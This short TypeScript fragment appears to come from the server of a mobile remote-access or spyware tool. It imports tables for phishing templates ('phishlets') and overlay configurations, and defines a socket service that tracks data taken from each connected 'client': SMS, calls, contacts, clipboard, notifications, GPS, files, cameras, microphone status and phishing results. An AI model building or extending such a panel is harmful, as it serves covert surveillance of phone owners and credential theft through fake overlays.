...
import { clients, overlayConfigs, phishletData, phishletTemplates } from '../db/schema.js';
...
class SocketService {
  ...
  private ensureClientData(clientId: string): void {
    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'wifi_error', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'overlay_status', 'phishlet_data'];
